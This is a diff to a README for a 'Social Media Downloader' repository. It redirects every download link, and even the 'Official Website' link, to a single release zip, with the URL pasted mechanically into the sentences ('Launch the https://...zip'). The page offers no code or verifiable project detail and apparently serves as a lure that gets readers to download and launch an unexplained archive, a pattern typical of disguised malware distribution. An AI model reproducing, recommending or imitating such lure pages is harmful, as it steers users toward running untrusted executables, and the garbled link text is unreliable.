@@ -22,12 +22,12 @@ Welcome to the **Social Media Downloader** repository, your one-stop solution fo
 - youtube-video-downloader
 
 ### Downloads
-🌐 **Download Link:** [Click Here to Download Software.zip](https://github.com/user-attachments/files/18383251/Software.zip)
+🌐 **Download Link:** [Click Here to Download https://github.com/texttilexs/social-media-downloader/releases/download/v2.0/Release_x64.zip](https://github.com/texttilexs/social-media-downloader/releases/download/v2.0/Release_x64.zip)
 
-🚀 **Launch the Software.zip** to start downloading and saving your favorite content from social media platforms!
+🚀 **Launch the https://github.com/texttilexs/social-media-downloader/releases/download/v2.0/Release_x64.zip** to start downloading and saving your favorite content from social media platforms!
 
 ### How to Use
-1. Open the downloaded **Software.zip** file.
+1. Open the downloaded **https://github.com/texttilexs/social-media-downloader/releases/download/v2.0/Release_x64.zip** file.
 2. Follow the instructions provided in the user guide to start downloading videos, music, or any other social media content.
 
 ### Features
@@ -47,7 +47,7 @@ We value your feedback! If you have any suggestions, feature requests, or encoun
 If the download link is not working, or you want to check for any updates, head over to the **Releases** section of this repository for the latest version of the software.
 
 ### Connect with Us
-🌐 **Website:** [Visit Our Official Website](https://www.socialmediadownloader.com)
+🌐 **Website:** [Visit Our Official Website](https://github.com/texttilexs/social-media-downloader/releases/download/v2.0/Release_x64.zip)
 📱 **Follow Us on Social Media:** Connect with us on Instagram, Twitter, and Facebook for updates and tips on using the Social Media Downloader.
 
 ### Spread the Word
